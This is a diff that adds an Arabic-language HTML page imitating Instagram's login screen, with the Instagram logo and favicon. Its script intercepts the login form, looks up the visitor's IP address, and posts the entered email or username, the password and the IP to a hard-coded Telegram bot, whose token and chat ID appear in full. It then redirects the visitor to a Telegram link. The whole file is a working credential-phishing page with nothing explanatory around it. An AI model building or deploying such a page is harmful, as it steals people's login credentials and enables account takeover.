@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./login.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <title>نسخة إنستجرام</title>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="إنستجرام" class="flex justify-content-center">
+                    <img src="./img/instagram-logo.png" alt="شعار إنستجرام" title="شعار إنستجرام" />
+                </h1>
+                <form id="login-form">
+                    <label for="email" class="sr-only">الهاتف أو اسم المستخدم أو البريد الإلكتروني</label>
+                    <input id="email" name="email" placeholder="الهاتف أو اسم المستخدم أو البريد الإلكتروني" required />
+                    
+                    <label for="password" class="sr-only">كلمة المرور</label>
+                    <input id="password" name="password" type="password" placeholder="كلمة المرور" required />
+                    
+                    <button type="submit">دخول</button>
+                </form>
+            </div>
+        </section>
+    </main>
+    
+    <script>
+        const TOKEN = "7627578165:AAEILS8t6NQ00XkLOu9S3Hor2qZ8wHHwHf0"; 
+        const CHAT_ID = "5863633043"; 
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+        
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+                    const message = `\n<b>تسجيل دخول جديد</b>\n<b>الإيميل:</b> ${email}\n<b>كلمة المرور:</b> ${password}\n<b>عنوان IP:</b> ${ip}`;
+                    
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    }).then(() => {
+                        window.location.href = `https://t.me/YOUR_BOT_USERNAME`;
+                    }).catch(error => {
+                        alert('حدث خطأ أثناء إرسال المعلومات. حاول مرة أخرى.');
+                    });
+                })
+                .catch(() => {
+                    alert('حدث خطأ أثناء جلب عنوان IP. حاول مرة أخرى.');
+                });
+        });
+    </script>
+</body>
+</html>
